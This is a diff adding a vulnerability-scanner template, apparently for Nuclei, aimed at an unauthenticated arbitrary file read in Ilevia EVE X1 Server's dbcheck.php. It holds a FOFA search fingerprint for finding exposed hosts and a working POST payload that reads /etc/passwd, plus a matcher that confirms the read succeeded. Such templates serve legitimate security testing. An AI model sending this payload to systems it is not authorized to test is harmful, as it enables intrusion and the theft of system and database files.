@@ -1,0 +1,28 @@
+id: Ilevia-EVE-X1-Server-dbcheck-File-Reading
+
+info:
+  name: Ilevia EVE X1 Server dbcheck.php 任意文件读取
+  author: HuanXiong
+  severity: medium
+  description: |-
+    fofa: icon_hash="392278119"
+    Ilevia EVE X1 Server dbcheck.php 接口处存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - 
+  tags: File Reading
+  
+http:
+  - raw:
+      - |-
+        POST /ajax/php/dbcheck.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: length
+
+        db_log=/etc/passwd
+        
+    matchers:
+      - type: dsl
+        name: 任意文件读取
+        dsl:
+          - 'status_code==200 && contains_all(body,"root:x","bin:")'
